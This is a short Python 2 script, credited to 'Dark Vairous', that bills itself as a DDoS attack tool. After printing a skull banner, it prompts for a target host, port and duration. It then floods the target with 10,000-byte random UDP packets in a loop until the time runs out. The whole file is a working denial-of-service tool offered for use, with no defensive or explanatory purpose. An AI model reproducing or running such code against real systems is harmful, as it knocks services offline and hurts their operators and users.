#!/usr/bin/python
#!--- coded by Dark Vairous ---!#
#!--- Iam Hacker ---!#
#colors
wi = "\033[1;37m" 
rd = "\033[0;31m" 
gr = "\033[1;32m" 
yl = "\033[1;33m" 
pu = "\033[1;35m" 
#------------------#
import os
import socket
import time 
import random
import sys
#------------------#

def doss():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payloads = random._urandom(10000)

    os.system("clear")
    print rd+'''
                                           __________
                                         .~#########%%;~.
                                        /############%%;`\
                                       /######/~\/~\%%;,;,\
                                      |#######\    /;;;;.,.|
                                      |#########\/%;;;;;.,.|
                             XX       |##/\####%;;;/\;,|       XX
                           XX..X      |#|  o  \##%;/  o  |.|      X..XX
                         XX.....X     |##\____/##%;\____/.,|     X.....XX
                    XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
                   X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
                   X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X
                   X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
                    X# \.X        @#%,.@                  @#%,.@        X./  #
                     ##  X          @#%,.@              @#%,.@          X   #
                   , "# #X            @#%,.@          @#%,.@            X ##
                      `###X             @#%,.@      @#%,.@             ####'
                     . ' ###              @#%.,@  @#%,.@              ###`"
                       . ";"                @#%.@#%,.@                ;"` ' .
                         '                    @#%,.@                   ,.
                          ,                @#%,.@  @@                
                                            @@@  @@@  

    '''
    print '''
                                +------------------------------+
                                | [+]     Dark Vairous     [+] |
                                +-----+-----------------+--+---+
                                      |   DDOS Attack   |     
                                      +-----------------+
    '''
    print'\n'
    print'\n'
    ip = raw_input(yl+"[*] ip or host Target : ")
    port = input(wi+"[*] port [Default port 80 ] :")
    seconds = input(rd+"[*] time the Attack : ")
    timeout = time.time() + seconds

    sent = 10 

    while True:

        try:

            if time.time() > timeout:
                break

            else:
                pass
            sock.sendto(payloads,(ip,port))
            sent = sent + 1 
            print (gr+' Attack starting on %s .... DDOS Attack By Virooous') % (ip)
        except KeyboardInterrupt:
            sys.exit()

doss()
